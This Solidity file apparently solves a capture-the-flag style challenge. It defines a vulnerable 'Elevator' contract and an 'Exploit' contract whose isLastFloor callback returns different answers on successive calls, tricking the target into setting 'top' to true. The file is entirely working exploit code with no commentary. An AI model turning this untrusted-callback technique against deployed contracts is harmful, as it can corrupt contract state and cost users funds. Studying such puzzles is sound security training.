// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


contract Exploit is Destructible, Targeted, Building {
  uint depth = 0;
  constructor(address target_addr) payable Targeted(target_addr) {
  }
  function isLastFloor(uint) external override returns (bool) {
    if (depth == 0) {
      depth = 1;
      return false;
    }
    else {
      depth = 0;
      return true;
    }
  }
  function exploit() public payable {
    depth = 0;
    Elevator target = Elevator(payable(Targeted(this).target()));
    target.goTo(0x4269);
  }
  receive() external payable {
  }
}